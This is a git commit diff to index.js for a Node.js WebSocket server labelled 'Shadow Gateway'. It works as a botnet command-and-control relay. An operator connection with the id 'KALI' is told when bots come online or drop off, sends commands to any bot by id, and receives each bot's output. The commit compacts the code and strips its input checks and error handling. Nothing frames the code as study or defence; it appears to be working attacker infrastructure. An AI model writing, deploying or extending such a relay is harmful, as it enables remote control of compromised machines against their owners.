843cdf77c47663c3b08979d70dde44081ff28ac9
novadv0020-web <novadv0020@gmail.com>
2026-01-27 15:02:04 -0300

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,5 @@
 const WebSocket = require('ws');
-const http = require('http');
-
-const server = http.createServer((_, r) => r.end('Shadow Gateway Active'));
+const server = require('http').createServer((q, r) => r.end('Shadow Up'));
 const wss = new WebSocket.Server({ server });
 
 let KALI = null;
@@ -9,38 +7,27 @@ const BOTS = new Map();
 
 wss.on('connection', (ws, req) => {
     const id = new URLSearchParams(req.url.split('?')[1]).get('id');
-    if (!id) return ws.close();
-
     if (id === 'KALI') {
         KALI = ws;
-        BOTS.forEach((_, botId) => KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId })));
+        BOTS.forEach((_, bId) => KALI.send(JSON.stringify({t:'bot', s:'on', id:bId})));
     } else {
-        // Se o bot já existe, mata a conexão anterior para não duplicar
-        if (BOTS.has(id)) {
-            BOTS.get(id).terminate();
-        }
+        if (BOTS.has(id)) BOTS.get(id).terminate();
         BOTS.set(id, ws);
-        if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'bot', s: 'on', id }));
+        if (KALI) KALI.send(JSON.stringify({t:'bot', s:'on', id}));
     }
 
-    ws.on('message', (raw) => {
+    ws.on('message', m => {
         if (ws === KALI) {
-            try {
-                const data = JSON.parse(raw);
-                const target = BOTS.get(data.to);
-                if (target?.readyState === WebSocket.OPEN) target.send(data.cmd);
-            } catch (e) {}
-        } else {
-            if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
+            const d = JSON.parse(m);
+            if (BOTS.has(d.to)) BOTS.get(d.to).send(d.cmd);
+        } else if (KALI) {
+            KALI.send(JSON.stringify({t:'res', f:id, d:m.toString()}));
         }
     });
 
     ws.on('close', () => {
         if (ws === KALI) KALI = null;
-        else if (BOTS.get(id) === ws) {
-            BOTS.delete(id);
-            if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'bot', s: 'off', id }));
-        }
+        else { BOTS.delete(id); if (KALI) KALI.send(JSON.stringify({t:'bot', s:'off', id})); }
     });
 });
 server.listen(process.env.PORT || 10000);
